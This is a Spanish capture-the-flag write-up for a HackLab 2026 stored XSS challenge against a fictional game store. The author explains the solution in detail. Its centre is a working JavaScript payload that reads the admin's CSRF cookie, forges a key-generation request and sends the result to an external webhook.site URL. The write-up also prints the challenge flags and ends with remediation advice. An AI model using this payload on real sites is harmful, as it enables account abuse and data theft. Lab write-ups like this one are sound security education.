# Desafío - Juegos casi libres (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** XSS (Stored XSS / Exfiltración CSRF)  
**Autor:** adonaissh  

---

## 📌 Enunciado

> **Juegos casi libres** es una tienda de videojuegos con ~70 títulos creada completamente por una IA.
>
> Te encomendaron una misión muy importante: adquirir aquel juego donde están reunidas otras IAs (maliciosas) que están planeando un ataque contra los humanos.
>
> No sabemos su nombre exacto, pero se interceptó un fragmento de una conversación entre ellas:
> - **IA-07:** *¿Confirmás el punto de encuentro? No quiero que un humano caiga de casualidad.*
> - **IA-12:** *Tranquila. Elegimos un juego de disparos, de esos tácticos por equipos. Ningún humano sospecha de un shooter más.*
> - **IA-07:** *¿Y por qué justo ese y no el original de siempre?*
> - **IA-12:** *Porque es la versión hecha acá, en el extremo sur del planeta. Nadie mira lo que se cocina tan abajo en el mapa.*
> - **IA-07:** *Entendido. Mismo clásico de siempre, pero con los colores celeste y blanco. Nos vemos adentro.*
>
> **Objetivo:** Deducir de qué juego hablan, engañar al sistema para adquirirlo y obtener la clave/flag final.

---

## 🔍 Análisis Inicial y Reconocimiento

### 1. Deducción del Juego Objetivo en el Catálogo
Analizando las pistas del diálogo interceptado:
- *"Juego de disparos táctico por equipos clásico"* $\rightarrow$ Counter-Strike.
- *"En el extremo sur del planeta"* / *"con los colores celeste y blanco"* $\rightarrow$ Argentina.

Revisando el catálogo de ~70 títulos en la plataforma, el juego buscado es:
- **Juego:** `Counter Strike Argentino`
- **Identificador (`juego_id`):** `cedfcf2a-03f0-4306-ad33-b5c8cf2c5de2`

### 2. Mapeo del Panel Administrativo
Al analizar los scripts del cliente (como `obfuscated.js` tras desofuscarlo), se identificó la ruta interna encargada de aprovisionar licencias y claves de activación:

```http
POST /admin-panel/claves/generar
Content-Type: application/json
X-CSRFToken: <csrftoken>

{
  "juego_id": "cedfcf2a-03f0-4306-ad33-b5c8cf2c5de2"
}
```

El endpoint requiere autenticación y privilegios del administrador, estando protegido mediante validación de token CSRF (`csrftoken`).

---

## 🔬 Identificación de la Vulnerabilidad (Stored XSS)

La tienda de videojuegos cuenta con secciones donde los usuarios pueden interactuar o enviar contenido (comentarios, reviews, reportes o datos de perfil) que posteriormente son visualizados por el administrador de la plataforma.

Se identificó una vulnerabilidad de **Cross-Site Scripting Almacenado (Stored XSS)**: las entradas provistas por los usuarios no son sanitizadas ni codificadas contextualmente antes de ser renderizadas en la consola administrativa.

Esto permite que un atacante inyecte código JavaScript que se ejecutará automáticamente en el navegador del administrador cuando este consulte la vista afectada.

---

## 🚀 Cadena de Explotación

Dado que el navegador del administrador posee una sesión activa y las cookies correspondientes (incluyendo el token anti-CSRF `csrftoken`), el payload inyectado puede actuar en su nombre (Cross-Site Scripting + CSRF) y exfiltrar la clave generada a un servicio receptor externo (como `webhook.site`).

### 1. Payload de Inyección y Exfiltración

Se elaboró el script en JavaScript para extraer el token CSRF, solicitar la generación de la clave para el juego y exfiltrar la respuesta vía un objeto `Image`:

```javascript
// 1. Extracción del token CSRF desde las cookies activas del administrador
var match = document.cookie.match(new RegExp('(^| )csrftoken=([^;]+)'));
var token = match ? match[2] : '';

// 2. Petición autenticada para generar la clave del juego objetivo
fetch('/admin-panel/claves/generar', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRFToken': token
  },
  body: JSON.stringify({
    juego_id: 'cedfcf2a-03f0-4306-ad33-b5c8cf2c5de2'
  })
})
.then(function(response) {
  return response.json();
})
.then(function(data) {
  // 3. Exfiltración de la clave a un listener externo (Webhook)
  new Image().src = 'https://webhook.site/80a81539-5b4f-4623-85f7-f4f9937c97b8?res=' + encodeURIComponent(JSON.stringify(data));
})
.catch(function(error) {
  new Image().src = 'https://webhook.site/80a81539-5b4f-4623-85f7-f4f9937c97b8?err=' + encodeURIComponent(error.message);
});
```

### 2. Recepción de la Clave del Juego

Cuando el bot/administrador visitó la página comprometida, su navegador ejecutó el payload y despachó la llamada al webhook:

```json
{
  "ok": true,
  "clave": "2297c1036c7ff216d5a2c86c219d2b3b",
  "juego": "Counter Strike Argentino"
}
```

Se obtuvo exitosamente la clave de activación intermedia:
`2297c1036c7ff216d5a2c86c219d2b3b`

### 3. Canje y Obtención de la Flag Final

Al ingresar la clave adquirida en el portal de la tienda para activar `Counter Strike Argentino`, el sistema validó la posesión legítima del juego y entregó la flag definitiva del desafío:

```text
==================================================
                 JUEGO ADQUIRIDO
             Counter Strike Argentino
==================================================

Flag: 23833dade2742ee5800b38902faf99e5
```

---

## 🏁 Flags

- **Clave de activación generada por el Admin:**
  ```text
  2297c1036c7ff216d5a2c86c219d2b3b
  ```

- **Flag final del Juez:**
  ```text
  23833dade2742ee5800b38902faf99e5
  ```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Cross-Site Scripting Almacenado (CWE-79). Falta de validación y sanitización en entradas del usuario procesadas en el panel de control administrativo, permitiendo la ejecución de scripts arbitrarios con el nivel de privilegios del administrador.
- **Recomendaciones:**
  - **Sanitización y Codificación Contextual:** Escapar todas las entradas del usuario antes de incrustarlas en el DOM mediante bibliotecas seguras (p. ej., DOMPurify) o recurriendo a interfaces seguras (`textContent`).
  - **Content Security Policy (CSP) Estricto:** Implementar directivas `script-src` y `connect-src` que bloqueen scripts inline y restrinjan conexiones fetch a dominios externos no autorizados como Webhooks.
  - **Cookies con Atributo `SameSite=Strict` y `HttpOnly`:** Asegurar que las cookies de sesión y tokens de autenticación no sean accesibles mediante JavaScript en el navegador.
